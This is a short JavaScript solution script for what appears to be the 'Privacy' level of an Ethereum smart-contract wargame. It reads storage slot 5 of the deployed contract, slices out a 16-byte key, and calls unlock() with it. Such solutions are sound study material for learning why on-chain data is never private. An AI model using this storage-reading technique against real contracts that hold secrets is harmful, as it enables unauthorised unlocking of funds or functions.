const {BLOCK_EXPLORER_URL, PRIVACY_INSTANCE_ADDRESS} = require('./utils');

async function main() {
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
    console.log('Privacy level');

    if (!PRIVACY_INSTANCE_ADDRESS) {
        console.log('Privacy instance address not found');
        return;
    }

    console.log('Privacy instance address', PRIVACY_INSTANCE_ADDRESS);

    const factory = await ethers.getContractFactory("Privacy");
    const contract = factory.attach(PRIVACY_INSTANCE_ADDRESS);
    const key32 = await ethers.provider.getStorageAt(contract.address, 5);
    const key16 = key32.slice(0, 16 * 2 + 2); // 16 bytes * 2 char + 2 char (0x)

    const tx = await contract.unlock(key16);
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
    await tx.wait(1);

    console.log('\x1b[32m%s\x1b[0m', 'Privacy level. Done !!!');
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
}

module.exports = main;
